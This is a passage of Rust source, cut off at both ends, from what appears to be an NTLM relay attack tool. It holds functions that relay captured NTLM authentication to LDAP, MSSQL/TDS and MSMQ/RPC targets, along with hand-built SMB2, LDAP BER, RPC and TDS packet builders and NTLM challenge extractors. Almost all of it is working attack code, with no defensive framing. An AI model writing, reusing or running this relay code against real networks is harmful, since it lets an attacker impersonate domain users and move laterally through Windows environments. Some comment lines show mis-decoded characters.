        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| RelayError::Connection(format!("LDAP connect: {}", e)))?;

        // LDAP SASL bind with GSS-SPNEGO wrapping NTLM negotiate
        let bind_req = build_ldap_sasl_bind(ntlm_negotiate, 1);
        stream
            .write_all(&bind_req)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP negotiate write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP negotiate read: {}", e)))?;

        if len < 10 {
            return Err(RelayError::Protocol("LDAP response too short".into()).into());
        }

        // Extract NTLM challenge from LDAP bind response (saslBindInProgress)
        let challenge = extract_ntlm_from_ldap_response(&response[..len])?;

        debug!("Got NTLM challenge from LDAP {}", target.address);
        Ok((stream, challenge))
    }

    async fn ldap_authenticate(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
    ) -> Result<()> {
        let bind_req = build_ldap_sasl_bind(ntlm_authenticate, 2);
        stream
            .write_all(&bind_req)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP auth write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP auth read: {}", e)))?;

        // Parse LDAP bind response â€” find the resultCode
        let result_code = parse_ldap_bind_result(&response[..len])?;

        if result_code == 0 {
            Ok(())
        } else {
            Err(RelayError::Authentication(format!(
                "LDAP bind failed with result code {}",
                result_code
            ))
            .into())
        }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // MSSQL/TDS Relay â€” Phase 1 & 2
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async fn mssql_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| RelayError::Connection(format!("MSSQL connect: {}", e)))?;

        let mut buf = vec![0u8; 65536];

        // TDS PRELOGIN
        let prelogin = build_tds_prelogin();
        stream
            .write_all(&prelogin)
            .await
            .map_err(|e| RelayError::Network(format!("TDS prelogin write: {}", e)))?;

        let _len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("TDS prelogin read: {}", e)))?;

        debug!("TDS prelogin OK with {}", target.address);

        // TDS LOGIN7 with NTLM negotiate as SSPI
        let login = build_tds_login7_sspi(ntlm_negotiate);
        stream
            .write_all(&login)
            .await
            .map_err(|e| RelayError::Network(format!("TDS login write: {}", e)))?;

        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("TDS login read: {}", e)))?;

        // Extract NTLM challenge from TDS SSPI token
        let challenge = extract_ntlm_from_tds(&buf[..len])?;

        debug!("Got NTLM challenge from MSSQL {}", target.address);
        Ok((stream, challenge))
    }

    async fn mssql_authenticate(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
    ) -> Result<()> {
        // TDS SSPI continuation (packet type 0x11)
        let auth_pkt = build_tds_sspi_message(ntlm_authenticate);
        stream
            .write_all(&auth_pkt)
            .await
            .map_err(|e| RelayError::Network(format!("TDS auth write: {}", e)))?;

        let mut buf = vec![0u8; 65536];
        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("TDS auth read: {}", e)))?;

        if len == 0 {
            return Err(RelayError::Authentication("Empty TDS response".into()).into());
        }

        // Check for LOGINACK token (0xAD) anywhere in the response
        // TDS response packet type 0x04 = Response
        if buf[0] == 0x04 {
            // Scan for LOGINACK token
            for &byte in &buf[8..len.saturating_sub(1)] {
                if byte == 0xAD {
                    return Ok(());
                }
            }
            // Check for ERROR token (0xAA) for better diagnostics
            for &byte in &buf[8..len.saturating_sub(1)] {
                if byte == 0xAA {
                    return Err(RelayError::Authentication(
                        "TDS returned ERROR token â€” auth failed".into(),
                    )
                    .into());
                }
            }
        }

        Err(RelayError::Authentication(format!(
            "MSSQL auth failed â€” TDS packet type 0x{:02X}",
            buf[0]
        ))
        .into())
    }
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // MSMQ Relay â€” Phase 1 & 2
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async fn msmq_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| RelayError::Connection(format!("MSMQ connect: {}", e)))?;

        let mut buf = vec![0u8; 65536];

        // MSMQ uses RPC on port 1801. Build an RPC bind with NTLM negotiate.
        let msmq_uuid = "fdb3a030-065f-11d1-bb9b-00a024ea5525";
        let bind_pdu = build_rpc_ntlm_bind(msmq_uuid, 1, ntlm_negotiate);
        stream
            .write_all(&bind_pdu)
            .await
            .map_err(|e| RelayError::Network(format!("MSMQ RPC bind write: {}", e)))?;

        let len = tokio::time::timeout(timeout, stream.read(&mut buf))
            .await
            .map_err(|_| {
                RelayError::Connection(format!(
                    "Timeout reading MSMQ bind response from {}",
                    target.address
                ))
            })?
            .map_err(|e| RelayError::Network(format!("MSMQ RPC bind read: {}", e)))?;

        // Validate RPC bind_ack: ver=5, type=12 (BIND_ACK), PFC_FIRST|PFC_LAST
        if len < 24 || buf[0] != 5 || buf[2] != 12 || buf[3] != 0x03 {
            return Err(RelayError::Authentication(
                "MSMQ RPC bind rejected or unexpected response".into(),
            )
            .into());
        }

        // Validate bind_ack presentation context result (byte 28: 0=acceptance)
        if len >= 29 && buf[28] != 0 {
            debug!("MSMQ bind_ack rejected context (result={})", buf[28]);
            return Err(RelayError::Authentication(format!(
                "MSMQ RPC bind context rejected (result={})",
                buf[28]
            ))
            .into());
        }

        // Extract NTLM challenge from the RPC bind_ack auth trailer
        if let Some(challenge) = extract_ntlm_from_rpc_challenge(&buf[..len]) {
            debug!("Got NTLM challenge from MSMQ {}", target.address);
            Ok((stream, challenge))
        } else {
            Err(
                RelayError::Authentication("No NTLM challenge found in MSMQ bind_ack".into())
                    .into(),
            )
        }
    }

    async fn msmq_authenticate(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
    ) -> Result<()> {
        // Send RPC request with NTLM authenticate as auth trailer
        // opnum 0 (generic) with empty stub data
        let auth_pdu = build_rpc_ntlm_request(0, ntlm_authenticate);
        stream
            .write_all(&auth_pdu)
            .await
            .map_err(|e| RelayError::Network(format!("MSMQ auth write: {}", e)))?;

        let mut buf = vec![0u8; 65536];
        let len = tokio::time::timeout(
            Duration::from_secs(self.config.timeout_secs),
            stream.read(&mut buf),
        )
        .await
        .map_err(|_| RelayError::Connection("Timeout reading MSMQ auth response".into()))?
        .map_err(|e| RelayError::Network(format!("MSMQ auth read: {}", e)))?;

        if len < 24 {
            return Err(RelayError::Authentication("MSMQ auth short response".into()).into());
        }

        // RPC response type 2 = Response PDU. Validate version and flags too.
        if buf[0] != 5 || buf[2] != 2 || buf[3] != 0x03 {
            return Err(RelayError::Authentication(format!(
                "MSMQ auth failed â€” RPC ver={} type=0x{:02X} flags=0x{:02X}",
                buf[0], buf[2], buf[3],
            ))
            .into());
        }
        Ok(())
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// RPC PDU Builders for MSMQ relay
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Parse UUID string into NDR wire format (mixed-endian).
/// Validates format before decoding; returns zero UUID on invalid input.
fn parse_uuid_to_ndr_compact(uuid_str: &str) -> Vec<u8> {
    // Validate UUID format: 8-4-4-4-12 hex digits with hyphens
    let parts: Vec<&str> = uuid_str.split('-').collect();
    if parts.len() != 5 {
        return vec![0u8; 16];
    }
    if parts[0].len() != 8
        || parts[1].len() != 4
        || parts[2].len() != 4
        || parts[3].len() != 4
        || parts[4].len() != 12
    {
        return vec![0u8; 16];
    }

    let hex: String = parts.join("");
    let bytes = match hex::decode(&hex) {
        Ok(b) => b,
        Err(_) => return vec![0u8; 16],
    };

    let mut ndr = Vec::with_capacity(16);
    ndr.extend_from_slice(&[bytes[3], bytes[2], bytes[1], bytes[0]]);
    ndr.extend_from_slice(&[bytes[5], bytes[4]]);
    ndr.extend_from_slice(&[bytes[7], bytes[6]]);
    ndr.extend_from_slice(&bytes[8..16]);
    ndr
}

/// Build an RPC bind PDU with NTLM authenticate as the auth trailer
fn build_rpc_ntlm_bind(interface_uuid: &str, version_major: u16, ntlm_token: &[u8]) -> Vec<u8> {
    let uuid_bytes = parse_uuid_to_ndr_compact(interface_uuid);

    let mut pdu = vec![5u8, 0, 11, 0x03]; // RPC v5.0, BIND, first+last frag
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR

    let total_auth = ntlm_token.len() + 16; // auth_header + ntlm_data
    let auth_len = if total_auth > usize::from(u16::MAX) {
        u16::MAX
    } else {
        total_auth as u16
    };
    let body_len = 72 + 24 + 16 + ntlm_token.len(); // fixed body + context + auth_info
    let frag_len = if (24 + body_len) > usize::from(u16::MAX) {
        u16::MAX
    } else {
        (24 + body_len) as u16
    };

    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&auth_len.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&0u32.to_le_bytes()); // call_id

    // Body
    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_xmit
    pdu.extend_from_slice(&4280u16.to_le_bytes()); // max_recv
    pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group

    pdu.push(1); // num_contexts
    pdu.extend_from_slice(&[0x00, 0x00, 0x00]); // padding

    // Context item
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.push(1); // num_transfer_syntaxes
    pdu.push(0); // padding
    pdu.extend_from_slice(&uuid_bytes);
    pdu.extend_from_slice(&version_major.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // minor
    let ndr_uuid = parse_uuid_to_ndr_compact("8a885d04-1ceb-11c9-9fe8-08002b104860");
    pdu.extend_from_slice(&ndr_uuid);
    pdu.extend_from_slice(&2u16.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());

    // Auth trailer (NTLM SSP with negotiate)
    let auth_type: u16 = 10; // NTLMSSP
    let auth_level: u16 = 6; // RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    let auth_pad: u8 = 0;
    let auth_reserved: u8 = 0;
    let ctx_id: u32 = 0;

    pdu.extend_from_slice(&auth_type.to_le_bytes());
    pdu.extend_from_slice(&auth_level.to_le_bytes());
    pdu.push(auth_pad);
    pdu.push(auth_reserved);
    pdu.extend_from_slice(&ctx_id.to_le_bytes());

    // NTLM token
    let token_len_bytes = (ntlm_token.len() as u32).to_le_bytes();
    pdu.extend_from_slice(&token_len_bytes);
    pdu.extend_from_slice(ntlm_token);

    // Pad to 4-byte alignment
    while !pdu.len().is_multiple_of(4) {
        pdu.push(0);
    }

    pdu
}

/// Build an RPC request PDU with NTLM authenticate as auth trailer
fn build_rpc_ntlm_request(opnum: u16, ntlm_token: &[u8]) -> Vec<u8> {
    let stub_data = [0u8; 4]; // minimal stub data
    let stub_len = stub_data.len();
    let total_frag = 24 + stub_len + 16 + ntlm_token.len();
    let frag_len = if total_frag > usize::from(u16::MAX) {
        u16::MAX
    } else {
        total_frag as u16
    };
    let auth_len_u16 = if (16 + ntlm_token.len()) > usize::from(u16::MAX) {
        u16::MAX
    } else {
        (16 + ntlm_token.len()) as u16
    };

    let mut pdu = vec![5u8, 0, 0, 0x03]; // RPC v5.0, REQUEST
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR

    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&auth_len_u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&2u32.to_le_bytes()); // call_id

    pdu.extend_from_slice(&(stub_len as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(&stub_data);

    // Auth trailer
    let auth_type: u16 = 10; // NTLMSSP
    let auth_level: u16 = 6;
    let auth_pad: u8 = 0;
    let auth_reserved: u8 = 0;
    let ctx_id: u32 = 1;

    pdu.extend_from_slice(&auth_type.to_le_bytes());
    pdu.extend_from_slice(&auth_level.to_le_bytes());
    pdu.push(auth_pad);
    pdu.push(auth_reserved);
    pdu.extend_from_slice(&ctx_id.to_le_bytes());

    let token_len_bytes = (ntlm_token.len() as u32).to_le_bytes();
    pdu.extend_from_slice(&token_len_bytes);
    pdu.extend_from_slice(ntlm_token);

    // Pad
    while !pdu.len().is_multiple_of(4) {
        pdu.push(0);
    }

    pdu
}

/// Extract NTLM challenge from RPC bind_ack response.
/// Validates RPC version, PDU type, and NTLM signature.
fn extract_ntlm_from_rpc_challenge(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 48 {
        return None;
    }
    // Validate RPC version 5, PDU type BIND_ACK (12), and flags
    if data[0] != 5 || data[2] != 12 {
        return None;
    }

    let auth_len = u16::from_le_bytes([data[10], data[11]]) as usize;
    if auth_len == 0 || data.len() < 24 + auth_len {
        return None;
    }

    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
    if frag_len > data.len() || frag_len < 32 {
        return None;
    }

    // Auth trailer is at the end of the PDU body.
    // Per RPC spec: trailer starts at (24 + frag_len - auth_len) but using
    // data.len() - auth_len is equivalent when no trailing padding present.
    let trailer_start = data.len() - auth_len;
    if trailer_start + 16 > data.len() {
        return None;
    }

    let token_len = u32::from_le_bytes([
        data[trailer_start + 12],
        data[trailer_start + 13],
        data[trailer_start + 14],
        data[trailer_start + 15],
    ]) as usize;

    if trailer_start + 16 + token_len > data.len() {
        return None;
    }

    let token = data[trailer_start + 16..trailer_start + 16 + token_len].to_vec();
    // Verify it looks like NTLM challenge (type 2)
    if token.len() >= 12
        && token[0..8] == *b"NTLMSSP\x00"
        && u32::from_le_bytes([token[8], token[9], token[10], token[11]]) == 2
    {
        return Some(token);
    }

    None
}
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Build correct SMB2 NEGOTIATE request.
/// Layout per [MS-SMB2] 2.2.3:
///   NetBIOS(4) + Header(64) + NegotiateBody(36+dialects)
fn build_smb2_negotiate(message_id: u64) -> Vec<u8> {
    let mut msg = Vec::with_capacity(128);

    // â”€â”€ NetBIOS session header (4 bytes) â”€â”€
    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Length placeholder

    // â”€â”€ SMB2 header (64 bytes) â”€â”€
    msg.extend_from_slice(b"\xfeSMB"); // ProtocolId
    msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
    msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
    msg.extend_from_slice(&0u32.to_le_bytes()); // Status
    msg.extend_from_slice(&0x0000u16.to_le_bytes()); // Command: NEGOTIATE
    msg.extend_from_slice(&31u16.to_le_bytes()); // CreditRequest
    msg.extend_from_slice(&0u32.to_le_bytes()); // Flags
    msg.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
    msg.extend_from_slice(&message_id.to_le_bytes()); // MessageId (u64)
    msg.extend_from_slice(&0u32.to_le_bytes()); // Reserved
    msg.extend_from_slice(&0u32.to_le_bytes()); // TreeId
    msg.extend_from_slice(&0u64.to_le_bytes()); // SessionId (u64)
    msg.extend_from_slice(&[0u8; 16]); // Signature

    // â”€â”€ NEGOTIATE request body (36 + dialects) â”€â”€
    msg.extend_from_slice(&36u16.to_le_bytes()); // StructureSize
    msg.extend_from_slice(&3u16.to_le_bytes()); // DialectCount
    msg.extend_from_slice(&1u16.to_le_bytes()); // SecurityMode (signing enabled)
    msg.extend_from_slice(&0u16.to_le_bytes()); // Reserved
    msg.extend_from_slice(&0u32.to_le_bytes()); // Capabilities
    msg.extend_from_slice(&[0u8; 16]); // ClientGuid (random not needed for relay)

    // ClientStartTime (8 bytes, 0 = MBZ when DialectCount > 0)
    msg.extend_from_slice(&0u64.to_le_bytes());

    // Dialects
    msg.extend_from_slice(&0x0202u16.to_le_bytes()); // SMB 2.0.2
    msg.extend_from_slice(&0x0210u16.to_le_bytes()); // SMB 2.1
    msg.extend_from_slice(&0x0300u16.to_le_bytes()); // SMB 3.0

    // Patch NetBIOS length
    let len = (msg.len() - 4) as u32;
    msg[1] = ((len >> 16) & 0xFF) as u8;
    msg[2] = ((len >> 8) & 0xFF) as u8;
    msg[3] = (len & 0xFF) as u8;

    msg
}

/// Build correct SMB2 SESSION_SETUP request.
/// Layout per [MS-SMB2] 2.2.5:
///   NetBIOS(4) + Header(64) + SessionSetup(24+security_buffer)
fn build_smb2_session_setup(ntlm_data: &[u8], session_id: u64, message_id: u64) -> Vec<u8> {
    let mut msg = Vec::with_capacity(128 + ntlm_data.len());

    // â”€â”€ NetBIOS session header â”€â”€
    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // â”€â”€ SMB2 header (64 bytes) â”€â”€
    msg.extend_from_slice(b"\xfeSMB");
    msg.extend_from_slice(&64u16.to_le_bytes()); // StructureSize
    msg.extend_from_slice(&0u16.to_le_bytes()); // CreditCharge
    msg.extend_from_slice(&0u32.to_le_bytes()); // Status
    msg.extend_from_slice(&0x0001u16.to_le_bytes()); // Command: SESSION_SETUP
    msg.extend_from_slice(&31u16.to_le_bytes()); // CreditRequest
    msg.extend_from_slice(&0u32.to_le_bytes()); // Flags
    msg.extend_from_slice(&0u32.to_le_bytes()); // NextCommand
    msg.extend_from_slice(&message_id.to_le_bytes()); // MessageId
    msg.extend_from_slice(&0u32.to_le_bytes()); // Reserved
    msg.extend_from_slice(&0u32.to_le_bytes()); // TreeId
    msg.extend_from_slice(&session_id.to_le_bytes()); // SessionId (u64!)
    msg.extend_from_slice(&[0u8; 16]); // Signature

    // â”€â”€ SESSION_SETUP request body â”€â”€
    // StructureSize = 25 (fixed, per spec)
    msg.extend_from_slice(&25u16.to_le_bytes());
    // Flags (0 = none)
    msg.push(0x00);
    // SecurityMode (1 = signing enabled)
    msg.push(0x01);
    // Capabilities (0)
    msg.extend_from_slice(&0u32.to_le_bytes());
    // Channel (0)
    msg.extend_from_slice(&0u32.to_le_bytes());

    // SecurityBufferOffset = header(64) + session_setup_body(24) minus the
    // 4-byte netbios prefix that's not counted. Per MS-SMB2, the offset is
    // from the beginning of the SMB2 header.
    // Header(64) + body_fixed_part(24) = 88
    let security_buffer_offset: u16 = 88;
    msg.extend_from_slice(&security_buffer_offset.to_le_bytes());
    // SecurityBufferLength
    msg.extend_from_slice(&(ntlm_data.len() as u16).to_le_bytes());
    // PreviousSessionId (u64)
    msg.extend_from_slice(&0u64.to_le_bytes());

    // Security buffer (NTLM data)
    msg.extend_from_slice(ntlm_data);

    // Patch NetBIOS length
    let len = (msg.len() - 4) as u32;
    msg[1] = ((len >> 16) & 0xFF) as u8;
    msg[2] = ((len >> 8) & 0xFF) as u8;
    msg[3] = (len & 0xFF) as u8;

    msg
}

/// Extract NTLM message from SMB2 SESSION_SETUP response
fn extract_ntlm_from_smb2(data: &[u8]) -> Result<Vec<u8>> {
    // Scan for NTLMSSP signature
    for i in 0..data.len().saturating_sub(12) {
        if &data[i..i + 8] == NTLM_SIGNATURE
            && let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..])
        {
            // Determine challenge message length from target name + target info fields
            // Minimum challenge is 56 bytes, but can be longer with target info
            let end = find_ntlm_challenge_end(&data[i..]);
            return Ok(data[i..i + end].to_vec());
        }
    }
    Err(RelayError::Protocol("No NTLM challenge in SMB2 response".into()).into())
}

/// Estimate the end of an NTLM challenge message
fn find_ntlm_challenge_end(ntlm_data: &[u8]) -> usize {
    if ntlm_data.len() < 32 {
        return ntlm_data.len();
    }

    // Check for target info at offset 40..48
    if ntlm_data.len() >= 48 {
        let info_len = u16::from_le_bytes([ntlm_data[40], ntlm_data[41]]) as usize;
        let info_offset =
            u32::from_le_bytes([ntlm_data[44], ntlm_data[45], ntlm_data[46], ntlm_data[47]])
                as usize;

        if info_offset + info_len <= ntlm_data.len() && info_offset + info_len > 0 {
            return info_offset + info_len;
        }
    }

    // Fallback: check target name at offset 12..20
    if ntlm_data.len() >= 20 {
        let name_len = u16::from_le_bytes([ntlm_data[12], ntlm_data[13]]) as usize;
        let name_offset =
            u32::from_le_bytes([ntlm_data[16], ntlm_data[17], ntlm_data[18], ntlm_data[19]])
                as usize;

        if name_offset + name_len <= ntlm_data.len() {
            return name_offset + name_len;
        }
    }

    ntlm_data.len().min(256)
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LDAP PDU Builders (proper BER encoding)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Build LDAP SASL Bind request with GSS-SPNEGO wrapping.
/// Uses proper BER definite-length encoding that handles
/// payloads > 127 bytes.
fn build_ldap_sasl_bind(ntlm_data: &[u8], message_id: u32) -> Vec<u8> {
    let mechanism = b"GSS-SPNEGO";

    // Build innermost â†’ outermost
    // Credentials: OCTET STRING
    let cred_tlv = ber_octet_string(ntlm_data);
    // Mechanism: OCTET STRING
    let mech_tlv = ber_octet_string(mechanism);
    // SASL auth choice: context tag [3] SEQUENCE { mechanism, credentials }
    let sasl_inner = [mech_tlv, cred_tlv].concat();
    let sasl_tlv = ber_wrap(0xA3, &sasl_inner);

    // Version: INTEGER 3
    let version_tlv = ber_integer(3);
    // DN: OCTET STRING (empty)
    let dn_tlv = ber_octet_string(b"");

    // BindRequest: APPLICATION 0
    let bind_inner = [version_tlv, dn_tlv, sasl_tlv].concat();
    let bind_tlv = ber_wrap(0x60, &bind_inner);

    // Message ID: INTEGER
    let msgid_tlv = ber_integer(message_id as i64);

    // SEQUENCE (top-level LDAP message)
    let msg_inner = [msgid_tlv, bind_tlv].concat();
    ber_wrap(0x30, &msg_inner)
}

/// Parse LDAP BindResponse to extract result code
fn parse_ldap_bind_result(data: &[u8]) -> Result<u8> {
    // Walk the BER structure to find the resultCode
    // SEQUENCE { INTEGER(msgid), APPLICATION 1 (BindResponse) { ENUMERATED(resultCode), ... } }
    // We scan for the pattern: 0x61 (APPLICATION 1) followed by length, then 0x0A (ENUMERATED)

    for i in 0..data.len().saturating_sub(4) {
        if data[i] == 0x61 {
            // APPLICATION 1 = BindResponse
            let (inner_start, _inner_len) = match ber_read_length(data, i + 1) {
                Some(v) => v,
                None => continue,
            };
            // First element should be ENUMERATED (0x0A) = resultCode
            if inner_start < data.len() && data[inner_start] == 0x0A {
                let (val_start, val_len) = match ber_read_length(data, inner_start + 1) {
                    Some(v) => v,
                    None => continue,
                };
                if val_len > 0 && val_start < data.len() {
                    return Ok(data[val_start]);
                }
            }
        }
    }

    Err(RelayError::Protocol("Cannot parse LDAP bind result".into()).into())
}

/// Extract NTLM message from LDAP BindResponse serverSaslCreds
fn extract_ntlm_from_ldap_response(data: &[u8]) -> Result<Vec<u8>> {
    // Scan for NTLMSSP signature in the response
    for i in 0..data.len().saturating_sub(12) {
        if &data[i..i + 8] == NTLM_SIGNATURE
            && let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..])
        {
            let end = find_ntlm_challenge_end(&data[i..]);
            return Ok(data[i..i + end].to_vec());
        }
    }
    Err(RelayError::Protocol("No NTLM challenge in LDAP response".into()).into())
}

// â”€â”€ BER helpers â”€â”€

fn ber_encode_length(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len < 256 {
        vec![0x81, len as u8]
    } else if len < 65536 {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    } else {
        vec![
            0x83,
            (len >> 16) as u8,
            ((len >> 8) & 0xFF) as u8,
            (len & 0xFF) as u8,
        ]
    }
}

fn ber_wrap(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut tlv = vec![tag];
    tlv.extend_from_slice(&ber_encode_length(content.len()));
    tlv.extend_from_slice(content);
    tlv
}

fn ber_octet_string(data: &[u8]) -> Vec<u8> {
    ber_wrap(0x04, data)
}

fn ber_integer(val: i64) -> Vec<u8> {
    let bytes = if val == 0 {
        vec![0x00]
    } else if val > 0 && val < 128 {
        vec![val as u8]
    } else if val > 0 && val < 256 {
        if val > 127 {
            vec![0x00, val as u8]
        } else {
            vec![val as u8]
        }
    } else {
        let be = val.to_be_bytes();
        let start = be.iter().position(|&b| b != 0).unwrap_or(7);
        // If high bit set, prepend 0x00 for positive numbers
        if val > 0 && be[start] & 0x80 != 0 {
            let mut v = vec![0x00];
            v.extend_from_slice(&be[start..]);
            v
        } else {
            be[start..].to_vec()
        }
    };
    ber_wrap(0x02, &bytes)
}

fn ber_read_length(data: &[u8], offset: usize) -> Option<(usize, usize)> {
    if offset >= data.len() {
        return None;
    }
    let first = data[offset];
    if first < 128 {
        Some((offset + 1, first as usize))
    } else {
        let num_bytes = (first & 0x7F) as usize;
        if offset + 1 + num_bytes > data.len() {
            return None;
        }
        let mut len: usize = 0;
        for i in 0..num_bytes {
            len = (len << 8) | data[offset + 1 + i] as usize;
        }
        Some((offset + 1 + num_bytes, len))
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TDS PDU Builders
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Build TDS PRELOGIN packet
fn build_tds_prelogin() -> Vec<u8> {
    let mut msg = Vec::with_capacity(48);

    // TDS header (8 bytes)
    msg.push(0x12); // Type: PRELOGIN
    msg.push(0x01); // Status: EOM
    msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
    msg.push(0x00); // PacketID
    msg.push(0x00); // Window

    // â”€â”€ PRELOGIN option tokens â”€â”€
    // Each token: type(1) + offset(2) + length(2)
    // Token 0: VERSION â€” offset=11, length=6
    msg.push(0x00);
    msg.extend_from_slice(&11u16.to_be_bytes());
    msg.extend_from_slice(&6u16.to_be_bytes());

    // Terminator
    msg.push(0xFF);

    // VERSION data: 15.0.0.0 (SQL 2019) + SubBuild 0
    msg.extend_from_slice(&[0x0F, 0x00, 0x00, 0x00]);
    msg.extend_from_slice(&0u16.to_be_bytes());

    // Patch TDS length
    let len = msg.len() as u16;
    msg[2..4].copy_from_slice(&len.to_be_bytes());

    msg
}

/// Build TDS LOGIN7 with NTLM negotiate as SSPI blob.
/// Per [MS-TDS] 2.2.6.4, LOGIN7 has a 94-byte fixed header
/// followed by variable data. The SSPI blob offset/length is
/// at header offset 0x5E (ibSSPI: u16, cbSSPI: u16).
fn build_tds_login7_sspi(ntlm_data: &[u8]) -> Vec<u8> {
    let mut msg = Vec::with_capacity(256);

    // TDS header (8 bytes)
    msg.push(0x10); // Type: LOGIN7
    msg.push(0x01); // Status: EOM
    msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
    msg.push(0x01); // PacketID
    msg.push(0x00); // Window

    // â”€â”€ LOGIN7 fixed portion (94 bytes from start of TDS data) â”€â”€
    let login_start = msg.len();

    msg.extend_from_slice(&0u32.to_le_bytes()); // Length (placeholder)
    msg.extend_from_slice(&0x74000004u32.to_le_bytes()); // TDSVersion (7.4)
    msg.extend_from_slice(&4096u32.to_le_bytes()); // PacketSize
